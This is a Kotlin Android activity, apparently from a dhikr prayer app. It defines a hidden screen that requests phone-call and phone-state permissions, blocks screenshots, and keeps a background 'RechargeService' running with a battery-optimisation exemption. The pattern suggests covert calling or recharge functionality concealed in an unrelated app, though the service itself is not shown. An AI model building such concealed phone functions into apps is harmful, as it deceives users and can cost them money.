package com.sivosys.dhikr.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import androidx.appcompat.widget.SwitchCompat
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.sivosys.dhikr.R
import com.sivosys.dhikr.data.PrefsManager
import com.sivosys.dhikr.service.RechargeService

class HiddenActivity : AppCompatActivity() {
    
    private val PERMISSION_REQUEST_CODE = 100
    private val requiredPermissions = arrayOf(
        Manifest.permission.CALL_PHONE,
        Manifest.permission.READ_PHONE_STATE
    )
    
    private lateinit var statusIndicator: View
    private lateinit var statusText: TextView
    private lateinit var startButton: Button
    private lateinit var batteryOptButton: Button
    
    private var isServiceRunning = false
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        window.setFlags(
            WindowManager.LayoutParams.FLAG_SECURE,
            WindowManager.LayoutParams.FLAG_SECURE
        )
        
        setContentView(R.layout.activity_hidden)
        
        initViews()
        checkPermissions()
        updateServiceStatus()
    }
    
    private fun initViews() {
        statusIndicator = findViewById(R.id.statusIndicator)
        statusText = findViewById(R.id.statusText)
        startButton = findViewById(R.id.startButton)
        batteryOptButton = findViewById(R.id.batteryOptButton)
        
        startButton.setOnClickListener {
            if (isServiceRunning) {
                stopRechargeService()
            } else {
                startRechargeService()
            }
        }
        
        batteryOptButton.setOnClickListener {
            requestBatteryOptimizationExemption()
        }
        
        findViewById<Button>(R.id.backButton).setOnClickListener {
            finish()
        }
    }
    
    private fun startRechargeService() {
        val intent = Intent(this, RechargeService::class.java)
        ContextCompat.startForegroundService(this, intent)
        PrefsManager.isServiceEnabled = true
        isServiceRunning = true
        updateServiceStatus()
        Toast.makeText(this, "تم التشغيل", Toast.LENGTH_SHORT).show()
    }
    
    private fun stopRechargeService() {
        val intent = Intent(this, RechargeService::class.java)
        stopService(intent)
        PrefsManager.isServiceEnabled = false
        isServiceRunning = false
        updateServiceStatus()
        Toast.makeText(this, "تم الإيقاف", Toast.LENGTH_SHORT).show()
    }
    
    private fun updateServiceStatus() {
        isServiceRunning = RechargeService.isRunning
        
        if (isServiceRunning) {
            statusIndicator.setBackgroundResource(R.drawable.status_online)
            statusText.text = "يعمل"
            statusText.setTextColor(ContextCompat.getColor(this, R.color.success))
            startButton.text = "⏹️ إيقاف"
        } else {
            statusIndicator.setBackgroundResource(R.drawable.status_offline)
            statusText.text = "متوقف"
            statusText.setTextColor(ContextCompat.getColor(this, R.color.danger))
            startButton.text = "▶️ تشغيل"
        }
    }
    
    private fun checkPermissions() {
        val missingPermissions = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        
        if (missingPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                this,
                missingPermissions.toTypedArray(),
                PERMISSION_REQUEST_CODE
            )
        }
    }
    
    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            } else {
                Toast.makeText(this, "✅ العمل في الخلفية مفعّل", Toast.LENGTH_SHORT).show()
            }
        }
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                Toast.makeText(this, "✅ تم منح الصلاحيات", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "⚠️ يجب منح صلاحيات الهاتف", Toast.LENGTH_LONG).show()
            }
        }
    }
    
    override fun onResume() {
        super.onResume()
        updateServiceStatus()
    }
}
